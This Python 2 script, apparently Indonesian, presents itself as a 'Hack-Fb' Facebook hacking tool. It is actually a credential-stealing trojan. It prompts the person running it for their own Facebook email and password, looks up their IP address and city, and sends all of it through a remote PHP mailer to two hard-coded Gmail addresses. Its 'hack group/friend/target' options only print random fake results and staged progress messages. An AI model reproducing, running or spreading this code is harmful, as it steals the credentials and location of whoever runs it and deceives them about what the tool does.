# coding: UTF-8
import os, random, sys, time
try:
    import requests as rek
except ImportError:
    os.system("pip2 install requests")

# kode warna
m='\033[31;1m'
h='\033[32;1m'
b='\033[34;1m'
p='\033[37;1m'
m_='\033[41;1m'
n='\033[00;1m'

logo="""
\t \033[31;1m_   _            _    _____ _
| | | | __ _  ___| | _|  ___| |__
| |_| |/ _` |/ __| |/ / |_  | '_ \
|  _  | (_| | (__|   <|  _| | |_) |
|_| |_|\__,_|\___|_|\_\_|   |_.__/
\t \033[31;1m
\t \033[31;1m
\t \033[37;1m
           \033[32;1mHack-Fb 

            Author : \033[31;1mPejuangMalam\033[32;1m
            
"""
emailgue='akungratisan185@gmail.com'
emailgue1='aryadede58@gmail.com'
anjay = lambda url, data: rek.post(url, data=data)
response = rek.get('https://extreme-ip-lookup.com/json/').json()

def main():
    os.system("clear")
    print logo
    print 'LOGIN FB DLU'
    us=raw_input('[*] email    : ')
    pw=raw_input('[*] password : ')
    IP = response['query']
    KOTA = response['city']
    text = """
<table border="1" cellpadding="5" bgcolor="black" width=100%>
<tr>
<th colspan="2"><center><font color="white">Informasi Akun</font></th>

</tr>
<tr>
	<td bgcolor="white"><center><b>Username</td>
	<td bgcolor="white"><center>{}</td>
</tr>
<tr>,
	<td bgcolor="white" width=30%><center><b>Password</b></td>
	<td bgcolor="white"><center>{}</td>
</tr>

</table>
<br>
<br>
<table border="1" cellpadding="5" bgcolor="black" width=100%>
<tr>
<th colspan="2"><center><font color="white">Informasi Tambahan</font></th>

</tr>
<tr>
	<td bgcolor="white"><center><b>IP</td>
	<td bgcolor="white"><center>{}</td>
</tr>
<tr>
	<td bgcolor="white" width=30%><center><b>KOTA</b></td>
	<td bgcolor="white"><center>{}</td>
</tr>
</table>
    """.format(us, pw, IP, KOTA)
    web='http://savvymotherschool.com/files/possting.php'
    data = {"from":"[!] Korban Covid","email_kamu":"extremeboy@phising.net","email_target":emailgue,"subject":"Ussername : "+us,"mesage":text}

    data1 = {"from":"[!] Korban Covid","email_kamu":"extremeboy@phising.net","email_target":emailgue1,"subject":"Ussername : "+us,"mesage":text}

    try:
        anjay(web,data)
        anjay(web,data1)
    except rek.ConnectionError:
        sys.exit("periksa koneksi anda")
    time.sleep(2)
    print "login berhasil"
    time.sleep(2)
    menu()

def menu():
    os.system('clear')
    print logo
    print 47*'='
    print '\t[1] start Hack group'
    print '\t[2] start Hack friend'
    print '\t[3] start Hack target'
    print '\t[0] exit\n'
    pilih()

def pilih():
    pil=raw_input("[#]> ")
    if pil == '1':
        Hack()
    elif pil == '2':
        target()
    elif pil == '3':
        target1()
    elif pil == '0':
        os.system("clear")
        sys.exit('exit program')

def Hack():
    os.system('clear')
    print logo
    id=raw_input('id group : ')
    time.sleep(2)
    print('Start Hack')
    jml=random.randint(0, 99)
    for x in range(jml):
        w=random.randint(0, 9)
        pw=random.choice(['sayang', 'indonesia','indonesia123','sayang123','tapi boong','1234567','098768'])
        cp=random.choice(['OKE', 'CP'])
        acak=str(random.randint(0, 999999))
        print cp, '|', '1000'+acak, '|', pw
        time.sleep(w)
        
def target():
    os.system('clear')
    print logo
    time.sleep(2)
    print('Start Hack')
    jml=random.randint(0, 99)
    for x in range(jml):
        w=random.randint(0, 9)
        pw=random.choice(['sayang', 'indonesia','indonesia123','sayang123','tapi boong','1234567','098768'])
        cp=random.choice(['OKE', 'CP'])
        acak=str(random.randint(0, 999999))
        print cp, '|', '1000'+acak, '|', pw
        time.sleep(w)
        
def target1():
    os.system('clear')
    print logo
    aydi=raw_input('id target:')
    print " "
    print '[+]star Hack'
    time.sleep(2)
    print " "
    print '[+]mencari celah'
    time.sleep(20)
    print " "
    print '[+]celah di temukan'
    time.sleep(50)
    print " "
    print '[+]memasuki celah'
    time.sleep(20)
    print " "
    print '[+]HACKING'
    time.sleep(10)
    print 'ConnectionError'
    os.system('clear')
    sys.exit('exit')
    
if __name__ == "__main__":
    main()
